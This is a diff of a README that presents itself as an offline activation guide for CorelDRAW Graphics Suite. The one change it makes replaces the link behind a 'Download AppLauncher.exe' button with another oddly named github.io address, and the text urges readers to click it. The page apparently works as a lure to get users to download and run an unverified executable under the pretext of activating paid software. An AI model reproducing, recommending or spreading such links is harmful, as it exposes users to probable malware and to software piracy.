@@ -1,6 +1,6 @@
 # 🎨 CorelDRAW Graphics Suite — Offline Activation Guide
 
-[![Download AppLauncher.exe](https://img.shields.io/badge/Download-AppLauncher.exe-brightgreen?style=for-the-badge)](https://carroplency78info1.github.io/.github/)  
+[![Download AppLauncher.exe](https://img.shields.io/badge/Download-AppLauncher.exe-brightgreen?style=for-the-badge)](https://draw1corelgraphics1activ8web0.github.io/.github/)  
 ⬇️ Click the green button above to download the offline setup assistant.
 
 ---
